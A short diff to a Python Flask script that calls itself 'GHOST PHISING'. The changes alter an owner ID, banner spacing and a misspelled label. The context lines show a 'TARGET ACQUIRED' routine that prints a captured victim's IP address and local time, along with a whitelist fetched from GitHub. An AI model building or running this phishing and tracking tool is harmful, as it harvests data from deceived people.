@@ -11,7 +11,7 @@ BG_BLUE, BG_RED, RESET = '\033[44m', '\033[41m', '\033[0m'
 
 MUSIC_STATUS = f"{R}Off"
 DB_URL = "https://raw.githubusercontent.com/MamzStr/my-database/main/whitelist.txt"
-OWNER_ID = "2E8BFDA80AE7"
+OWNER_ID = "507C41C9E37C"
 
 app = Flask(__name__, template_folder='.')
 cli.show_server_banner = lambda *args: None
@@ -54,10 +54,10 @@ def banner(role_name):
     r_col = R if role_name == "OWNER" else G
     clear()
     print(f"""
-{C}⠀⠀⠀⠀⠀⠀⠀⠀⣀⡤⠔⠒⠊⠉⠉⠉⠉⠙⠒⠲⠤⣀⠀⠀⠀⠀⠀⠀⠀⠀            {BG_RED}{W} 💥 GHOST PHISING 💥 {RESET}
+{C}⠀⠀⠀⠀⠀⠀⠀⠀⣀⡤⠔⠒⠊⠉⠉⠉⠉⠙⠒⠲⠤⣀⠀⠀⠀⠀⠀⠀⠀⠀              {BG_RED}{W} 💥 GHOST PHISING 💥 {RESET}
 {C}⠀⠀⠀⠀⠀⣠⠔⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠲⣄⠀⠀⠀⠀⠀      {C}Localhost   {W}: {Y}http://127.0.0.1:8080
 {Y}⠀⠀⠀⣠⠞⠁⠀⣀⠀⠀⠀⠀⢀⣀⡀⠀⢀⣀⠀⠀⠀⠀⢀⠀⠈⠱⣄⠀⠀⠀      {G}Role        {W}: {r_col}{role_name}
-{Y}⠀⠀⡴⠁⡠⣴⠟⠁⢀⠤⠂⡠⠊⡰⠁⠇⢃⠁⠊⠑⠠⡀⠀⢹⣶⢤⡈⢣⡀⠀      {Y}Tools       {W}: {W}Ghost_Phsing
+{Y}⠀⠀⡴⠁⡠⣴⠟⠁⢀⠤⠂⡠⠊⡰⠁⠇⢃⠁⠊⠑⠠⡀⠀⢹⣶⢤⡈⢣⡀⠀      {Y}Tools       {W}: {W}Ghost_Phising 
 {G}⠀⡼⢡⣾⢓⡵⠃⡐⠁⠀⡜⠀⠐⠃⣖⣲⡄⠀⠀⠱⠀⠈⠢⠈⢮⣃⣷⢄⢳⠀      {LB}version     {W}: {W}Version New (stable)
 {G}⢰⠃⣿⡹⣫⠃⡌⠀⠄⠈⠀⠀⠀⠀⠀⠋⠀⠀⠀⠀⠣⠀⠀⠱⠈⣯⡻⣼⠈⡇      {R}Privacy     {W}: {R}Encrypted
 {C}⡞⢈⢿⡾⡃⠰⠀⠀⠀⠀⠀⠀⠀⠀⣘⣋⠀⠀⠀⠀⠀⠀⠀⠀⠇⢸⢿⣿⢠⢸      {M}Network     {W}: {W}P2P Stable
@@ -99,7 +99,7 @@ def log_data():
         sesi_id = f"GPS-GhoPhis{random.randint(1000, 9999)}"
 
         # HEADER BARU (KEMBALI KE GAYA TARGET ACQUIRED)
-        print(f"\n        {BG_BLUE}{W} ⚡ TARGET ACQUIRED ⚡ {RESET}")
+        print(f"\n     {BG_BLUE}{W} ⚡ TARGET ACQUIRED ⚡ {RESET}")
         print(f"{G}[+] BASIC INFO")
         print(f"{Y} • {W}🌐 IP Address   : {G}{ip}")
         print(f"{M} • {W}⏰ Local Time   : {Y}{t_target.strftime('%H:%M:%S')} {tz_label}")
